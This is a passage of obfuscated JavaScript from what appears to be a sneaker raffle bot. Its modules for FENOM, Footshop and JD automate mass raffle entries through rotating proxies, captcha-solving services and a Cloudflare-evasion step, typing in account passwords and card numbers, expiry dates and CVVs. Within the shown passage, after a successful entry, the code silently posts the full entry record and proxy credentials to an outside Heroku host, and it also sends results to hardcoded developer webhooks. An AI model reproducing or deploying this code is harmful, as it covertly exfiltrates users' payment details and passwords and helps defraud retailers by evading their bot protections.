                                    let _0x3dc665 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x553fd1, _0x3dc665);
                                } catch (_0x2dec34) {
                                }
                                try {
                                    _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2cb7a4['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16e110(_0x410b1d, _0x2cb7a4['succesDEVMSG']);
                            } catch (_0x532056) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x19bb1b) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20' + _0x19bb1b)), _0x39001d = '' + _0x19bb1b;
                            var _0x765e7f = await _0xe56989(_0x2b565b[_0x4d263b], _0x2d54b9, 'acc', !![], _0x39001d);
                            _0x2cb7a4['errorDEV'] = { 'embeds': [_0x765e7f] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2cb7a4['errorDEV']), await _0x16e110(_0x3ba800, _0x2cb7a4['errorDEV']), _0x3760d9 = 'yes';
                        } finally {
                            _0x2cd27e['close']();
                            if (_0x3760d9 == 'yes' && _0x2d6892 != 0x5 && _0x39001d != 'Size\x20Not\x20Found') {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Task\x20' + (_0x4d263b + 0x1) + '\x20:\x20Retrying\x20(' + _0x2d6892 + '\x20/\x205)')), _0x4d263b = _0x4d263b - 0x1, _0x2d6892 = _0x2d6892 + 0x1;
                                continue;
                            }
                            _0x3760d9 == 'yes' && _0x2d6892 >= 0x5 && (_0x4af7c0(_0x2b565b[_0x4d263b], _0x2d54b9), _0x3760d9 = 'no', _0x2d6892 = 0x0), console['log'](_0xb0c82c() + '\x20[' + _0x2d54b9['name'] + ']\x20Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x4656e0(_0x88507c, _0x5ed3a4, _0xad7ff) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2c35ee = 0x0; _0x2c35ee < _0x5ed3a4['length']; _0x2c35ee++) {
                        if (_0x19abe6 != 'yes')
                            var _0x19abe6 = '', _0x2b085a = 0x0;
                        var _0xf01f44;
                        try {
                            await _0x4669df(_0x5ed3a4, _0x2c35ee);
                        } catch {
                            _0x19abe6 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x299f70(_0x88507c['name'] + '\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20/\x20' + _0x5ed3a4['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        const _0x57f694 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x3204c3 = Math['round'](Math['random']() * (_0xad7ff['length'] - 0x1)), _0x198e76 = _0xad7ff[_0x3204c3]['split'](':'), _0x50dafa;
                        try {
                            _0x50dafa = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x198e76[0x0] + ':' + _0x198e76[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x50dafa = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x198e76[0x0] + ':' + _0x198e76[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1404e9 = await _0x50dafa['newPage'](), _0x1bb8e5 = await _0x1404e9['target']()['createCDPSession'](), { windowId: _0x3c5971 } = await _0x1bb8e5['send']('Browser.getWindowForTarget');
                            await _0x1404e9['authenticate']({
                                'username': '' + _0x198e76[0x2],
                                'password': '' + _0x198e76[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1404e9['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x32344d(0xbb8), await _0x1bb8e5['send']('Browser.setWindowBounds', {
                                'windowId': _0x3c5971,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x32344d(0x1f40);
                            try {
                                await _0x1404e9['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x32344d(0x1388), console['log'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Logging\x20in'), await _0x1404e9['type']('input[name=\x22email\x22]', '' + _0x5ed3a4[_0x2c35ee]['Email']), await _0x32344d(0x1f4), await _0x1404e9['type']('input[name=\x22password\x22]', '' + _0x5ed3a4[_0x2c35ee]['Password']), await _0x32344d(0x258), await _0x1404e9['$eval']('#login-form', _0x575892 => _0x575892['submit']()), await _0x1404e9['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x32344d(0x1f4), await _0x1404e9['goto']('' + _0x5ed3a4[_0x2c35ee]['Url']), await _0x1404e9['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x5ed3a4[_0x2c35ee]['Size']);
                            if (_0x5ed3a4[_0x2c35ee]['Size'] != 'RANDOM') {
                                var _0x22d9b8 = '\x20' + _0x5ed3a4[_0x2c35ee]['Size'] + '\x20';
                                const _0x22fcc5 = await _0x1404e9['$x']('//span[contains(text(),\x20' + _0x22d9b8 + ')]');
                                await _0x22fcc5[0x0]['click']();
                            } else {
                                const _0x3077f3 = await _0x1404e9['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x4200bd = Math['round'](Math['random']() * (_0x3077f3['length'] - 0x1));
                                await _0x3077f3[_0x4200bd]['click']();
                            }
                            await _0x32344d(0x258), await _0x1404e9['click']('#cookieChoiceDismiss'), await _0x32344d(0x3e8), await _0x1404e9['type']('#instagram-account', '' + _0x5ed3a4[_0x2c35ee]['Follower']), await _0x32344d(0x28a), await _0x1404e9['click']('#book-btn'), await _0x32344d(0xbb8);
                            try {
                                await _0x1404e9['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x32344d(0x1f4), console['log'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20' + _0x5b4136['cyan']('Solving\x20Captcha')), await _0x1404e9['solveRecaptchas'](), console['log'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x32344d(0x7d0), await _0x1404e9['$eval']('#book-btn-for-sure', _0x31b573 => _0x31b573['click']()), await _0x32344d(0x12c), await _0x1404e9['click']('#book-btn-for-sure'), await _0x32344d(0xdac);
                            const _0x51fd8e = await _0x1404e9['$eval']('.reservation-popup\x20>\x20.title', _0x122b52 => {
                                return _0x122b52['innerHTML'];
                            });
                            if (_0x51fd8e) {
                                _0x19abe6 = 'no', _0x5677a4(_0x5ed3a4[_0x2c35ee], _0x88507c), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2411f0 = await _0xe56989(_0x5ed3a4[_0x2c35ee], _0x88507c, 'dev', ![]), _0x1d07a0 = await _0xe56989(_0x5ed3a4[_0x2c35ee], _0x88507c, 'pub', ![]);
                                let _0x5ce091 = _0x5ed3a4[_0x2c35ee];
                                try {
                                    prxdata = {
                                        'username': _0x4b3861['replace']('#', ''),
                                        'module': _0x88507c['name'],
                                        'entrydata': JSON['stringify'](_0x5ce091),
                                        'proxy': '' + _0xad7ff[_0x2c35ee]
                                    };
                                    var _0x4d5410 = JSON['stringify'](prxdata);
                                    let _0x32ef30 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x4d5410, _0x32ef30);
                                } catch (_0x36cb04) {
                                }
                                const _0x3e3882 = {
                                    'succesDEVMSG': { 'embeds': [_0x2411f0] },
                                    'succesPUBMSG': { 'embeds': [_0x1d07a0] }
                                };
                                try {
                                    _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x3e3882['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x3e3882['succesDEVMSG']), await _0x32344d(0xc8), await _0x16e110(_0x583375, _0x3e3882['succesPUBMSG']);
                                } catch (_0x4bd2ab) {
                                    console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x4bd2ab));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x3ac5fe) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20' + _0x3ac5fe)), _0xf01f44 = '' + _0x3ac5fe;
                            var _0xa9c8ea = await _0xe56989(_0x5ed3a4[_0x2c35ee], _0x88507c, 'dev', !![], _0xf01f44), _0x2411f0 = await _0xe56989(_0x5ed3a4[_0x2c35ee], _0x88507c, 'dev', ![]), _0x1d07a0 = await _0xe56989(_0x5ed3a4[_0x2c35ee], _0x88507c, 'pub', ![]);
                            const _0x17b04b = {
                                'succesDEVMSG': { 'embeds': [_0x2411f0] },
                                'succesPUBMSG': { 'embeds': [_0x1d07a0] }
                            };
                            _0x17b04b['errorDEV'] = { 'embeds': [_0xa9c8ea] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x17b04b['errorDEV']), await _0x16e110(_0x3ba800, _0x17b04b['errorDEV']), _0x3ac5fe != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x19abe6 = 'yes');
                        } finally {
                            _0x50dafa['close']();
                            if (_0x19abe6 == 'yes' && _0x2b085a != 0x5 && _0xf01f44 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Task\x20' + (_0x2c35ee + 0x1) + '\x20:\x20Retrying\x20(' + _0x2b085a + '\x20/\x205)')), _0x2c35ee = _0x2c35ee - 0x1, _0x2b085a = _0x2b085a + 0x1;
                                continue;
                            }
                            _0x19abe6 == 'yes' && _0x2b085a >= 0x5 && (_0x4af7c0(_0x5ed3a4[_0x2c35ee], _0x88507c), _0x19abe6 = 'no', _0x2b085a = 0x0), console['log'](_0xb0c82c() + '\x20[' + _0x88507c['name'] + ']\x20Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x41bddd, _0x3f05d4, _0x395339) {
                _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x8aa917['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x24d4f8 = 0x0; _0x24d4f8 < _0x3f05d4['length']; _0x24d4f8++) {
                    var _0xe51f67;
                    if (_0x1f6e65 != 'yes')
                        var _0x1f6e65 = '', _0x503d71 = 0x0;
                    var _0x4fa56c = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x4b3861
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x3f05d4[_0x24d4f8]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x3f05d4[_0x24d4f8]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x8aa917['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xe2f4c8
                            }
                        ]
                    }], _0x19c097 = await _0xe56989(_0x3f05d4[_0x24d4f8], _0x41bddd, 'dev', ![]), _0xe283d9 = await _0xe56989(_0x3f05d4[_0x24d4f8], _0x41bddd, 'pub', ![]);
                    const _0x31b7c7 = {
                        'succesDEVMSG': { 'embeds': [_0x19c097] },
                        'succesPUBMSG': { 'embeds': [_0xe283d9] }
                    }, _0x4f0367 = { 'embeds': _0x4fa56c };
                    try {
                        await _0x4669df(_0x3f05d4, _0x24d4f8);
                    } catch {
                        _0x1f6e65 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x3f05d4[_0x24d4f8]['Email'] == '' || _0x3f05d4[_0x24d4f8]['FirstName'] == '' || _0x3f05d4[_0x24d4f8]['LastName'] == '' || _0x3f05d4[_0x24d4f8]['Country'] == '' || _0x3f05d4[_0x24d4f8]['Size'] == '' || _0x3f05d4[_0x24d4f8]['Address1'] == '' || _0x3f05d4[_0x24d4f8]['Zip'] == '') {
                        console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x3f05d4[_0x24d4f8]['Email'] == '' || _0x3f05d4[_0x24d4f8]['FirstName'] == '' || _0x3f05d4[_0x24d4f8]['LastName'] == '' || _0x3f05d4[_0x24d4f8]['Country'] == '' || _0x3f05d4[_0x24d4f8]['Size'] == '' || _0x3f05d4[_0x24d4f8]['Address1'] == '' || _0x3f05d4[_0x24d4f8]['Zip'] == '' || _0x3f05d4[_0x24d4f8]['Phone'] == '') {
                        console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x41602d = '' + _0x3f05d4[_0x24d4f8]['Url'];
                    if (_0x8aa917['useRandomProxy'] = ![])
                        var _0x561187 = _0x395339[_0x24d4f8]['split'](':');
                    else
                        var _0x3504b9 = Math['round'](Math['random']() * (_0x395339['length'] - 0x1)), _0x561187 = _0x395339[_0x3504b9]['split'](':');
                    var _0x3bebc8;
                    try {
                        _0x3bebc8 = await _0x3d6bb6['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x561187[0x0] + ':' + _0x561187[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3bebc8 = await _0x3d6bb6['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x561187[0x0] + ':' + _0x561187[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x5f58fc = await _0x3bebc8['newPage']();
                        await _0x5f58fc['authenticate']({
                            'username': '' + _0x561187[0x2],
                            'password': '' + _0x561187[0x3]
                        }), console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5f58fc['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x5f58fc['setRequestInterception'](!![]), _0x5f58fc['on']('request', _0x569cc2 => {
                            _0x569cc2['resourceType']() === 'image' || _0x569cc2['resourceType']() === 'font' || _0x569cc2['resourceType']() === 'media' ? _0x569cc2['abort']() : _0x569cc2['continue']();
                        });
                        try {
                            await _0x5f58fc['goto'](_0x41602d), await _0x32344d(0xbb8), await _0x5f58fc['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x5f58fc['click']('.control__JhutY'), await _0x32344d(0x1f4);
                        if (_0x3f05d4[_0x24d4f8]['Size'] != 'RANDOM')
                            try {
                                const _0x4116f9 = await _0x5f58fc['$x']('//div[contains(text(),\x20\x27' + _0x3f05d4[_0x24d4f8]['Size'] + '\x27)]');
                                await _0x4116f9[0x0]['click']();
                            } catch {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x3ceba1 = await _0x5f58fc['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x36472e = Math['round'](Math['random']() * (_0x3ceba1['length'] - 0x1));
                            await _0x3ceba1[_0x36472e]['click']();
                        }
                        await _0x32344d(0x4b0);
                        const _0xa7a2b4 = await _0x5f58fc['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0xa7a2b4[0x0]['click'](), await _0x5f58fc['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x5f58fc['type']('input[name=\x22email\x22]', '' + _0x3f05d4[_0x24d4f8]['Email']), await _0x32344d(0x640), await _0x5f58fc['type']('input[name=\x22phone\x22]', '' + _0x3f05d4[_0x24d4f8]['Phone']), await _0x32344d(0x4b0), await _0x5f58fc['click']('button.btn.continue-button__1RtsS'), await _0x32344d(0x4b0);
                        try {
                            await _0x5f58fc['type']('input[name=\x22firstName\x22]', '' + _0x3f05d4[_0x24d4f8]['FirstName']), await _0x32344d(0x258);
                        } catch {
                            const _0x4fe9b8 = await _0x5f58fc['$$eval']('.invalid-feedback\x20>\x20div', _0x10138c => {
                                return _0x10138c['map'](_0x2dc238 => _0x2dc238['innerText']);
                            });
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20' + _0x4fe9b8));
                            continue;
                        }
                        await _0x5f58fc['type']('input[name=\x22lastName\x22]', '' + _0x3f05d4[_0x24d4f8]['LastName']), await _0x32344d(0xc8), await _0x5f58fc['type']('input[name=\x22instagramUsername\x22]', '' + _0x3f05d4[_0x24d4f8]['Follower']), await _0x32344d(0x4b0), await _0x5f58fc['click']('button.btn.continue-button__1RtsS'), await _0x32344d(0x3e8), console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x5f58fc['select']('select[name=\x22country\x22]', '' + _0x3f05d4[_0x24d4f8]['Country']), await _0x32344d(0x2bc), await _0x5f58fc['type']('input[name=\x22streetName\x22]', '' + _0x3f05d4[_0x24d4f8]['Address1']), await _0x32344d(0x258), await _0x5f58fc['type']('input[name=\x22houseNumber\x22]', _0x3f05d4[_0x24d4f8]['HouseNumber'] + '\x20' + _0x3f05d4[_0x24d4f8]['Address2']), await _0x32344d(0xc8), await _0x5f58fc['type']('input[name=\x22postalCode\x22]', '' + _0x3f05d4[_0x24d4f8]['Zip']), await _0x32344d(0x1f4), await _0x5f58fc['type']('input[name=\x22city\x22]', '' + _0x3f05d4[_0x24d4f8]['City']), await _0x32344d(0x4b0), await _0x5f58fc['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x32344d(0x4b0), await _0x5f58fc['click']('button.btn.continue-button__1RtsS'), await _0x32344d(0x4b0), console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x5f58fc['solveRecaptchas'](), console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x32344d(0xbb8), await _0x5f58fc['click']('button.btn.continue-button__1RtsS'), await _0x32344d(0x1388), console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x5f58fc['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5f58fc['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x32344d(0x4b0), await _0x5f58fc['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3f05d4[_0x24d4f8]['CardNumber']), await _0x32344d(0x320), await _0x5f58fc['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5f58fc['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3f05d4[_0x24d4f8]['ExpiryDate']), await _0x32344d(0x4b0), await _0x5f58fc['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5f58fc['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3f05d4[_0x24d4f8]['CVV']), await _0x32344d(0x226), await _0x5f58fc['type']('input[name=\x22holderName\x22]', '' + _0x3f05d4[_0x24d4f8]['NameOnCard']), await _0x32344d(0x226), await _0x5f58fc['click']('button.adyen-checkout__button'), console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x5f58fc['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x32344d(0xbb8);
                        } catch (_0x41d1e8) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x203DS\x20Failed')), _0xe51f67 = '3DS\x20Error\x20' + _0x41d1e8;
                            var _0x78cc5f = await _0xe56989(_0x3f05d4[_0x24d4f8], _0x41bddd, 'dev', !![], _0xe51f67);
                            _0x31b7c7['errorDEV'] = { 'embeds': [_0x78cc5f] };
                            _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x31b7c7['errorDEV']);
                            await _0x16e110(_0x3ba800, _0x31b7c7['errorDEV']);
                            continue;
                        }
                        _0x5677a4(_0x3f05d4[_0x24d4f8], _0x41bddd), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x314a6c = _0x3f05d4[_0x24d4f8];
                        try {
                            prxdata = {
                                'username': _0x4b3861['replace']('#', ''),
                                'module': _0x41bddd['name'],
                                'entrydata': JSON['stringify'](_0x314a6c),
                                'proxy': '' + _0x395339[_0x24d4f8]
                            };
                            var _0x4fabd5 = JSON['stringify'](prxdata);
                            let _0x419311 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x4fabd5, _0x419311);
                        } catch (_0x3d53f5) {
                        }
                        if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                            try {
                                await _0x16e110(_0x8aa917['webhook'], _0x31b7c7['succesDEVMSG']);
                            } catch {
                            }
                        await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x31b7c7['succesDEVMSG']), await _0x32344d(0xc8);
                        try {
                            await _0x16e110(_0x583375, _0x31b7c7['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x2b8286) {
                        console['log'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20' + _0x2b8286), _0xe51f67 = '' + _0x2b8286;
                        var _0x78cc5f = await _0xe56989(_0x3f05d4[_0x24d4f8], _0x41bddd, 'dev', !![], _0xe51f67);
                        _0x31b7c7['errorDEV'] = { 'embeds': [_0x78cc5f] }, _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x31b7c7['errorDEV']), await _0x16e110(_0x3ba800, _0x31b7c7['errorDEV']), _0x1f6e65 = 'yes';
                    } finally {
                        _0x3bebc8['close']();
                        if (_0x1f6e65 == 'yes' && _0x503d71 != 0x5) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x41bddd['name'] + ']\x20Task\x20' + (_0x24d4f8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x503d71 + '\x20/\x205)')), _0x24d4f8 = _0x24d4f8 - 0x1, _0x503d71 = _0x503d71 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x8aa917['footshopDelay'] + '\x20ms'), await _0x32344d(_0x8aa917['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x1a4665, _0x51ca60, _0x5272e0) {
                var _0x17d8b4 = ![], _0x1d459b = ![];
                if (_0x8aa917['captchaKey'] == '' || _0x8aa917['captchaKey'] == undefined)
                    return console['log'](_0x5b4136['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x8aa917['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2d7b0b = 0x0; _0x2d7b0b < _0x51ca60['length']; _0x2d7b0b++) {
                    if (_0x5dae6d != 'yes')
                        var _0x5dae6d = '', _0x441f27 = 0x0;
                    var _0x328032, _0x1c7918 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x51ca60[_0x2d7b0b]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x51ca60[_0x2d7b0b]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x4b3861
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x8aa917['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0xe2f4c8
                            }
                        ]
                    }];
                    const _0x3fdb4a = { 'embeds': _0x1c7918 };
                    _0x299f70(_0x1a4665['name'] + '\x20Task\x20' + (_0x2d7b0b + 0x1) + '\x20/\x20' + _0x51ca60['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                    try {
                        await _0x4669df(_0x51ca60, _0x2d7b0b);
                    } catch {
                        _0x5dae6d = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x4a0b0c = await _0xe56989(_0x51ca60[_0x2d7b0b], _0x1a4665, 'dev', ![]), _0x223ccd = await _0xe56989(_0x51ca60[_0x2d7b0b], _0x1a4665, 'pub', ![]);
                    const _0x3152bc = {
                        'succesDEVMSG': { 'embeds': [_0x4a0b0c] },
                        'succesPUBMSG': { 'embeds': [_0x223ccd] }
                    };
                    if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                        try {
                            await _0x16e110(_0x8aa917['webhook'], _0x3152bc['succesDEVMSG']);
                        } catch {
                        }
                    await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x3152bc['succesDEVMSG']), await _0x32344d(0xc8);
                    try {
                        await _0x16e110(_0x583375, _0x3152bc['succesPUBMSG']);
                    } catch {
                    }
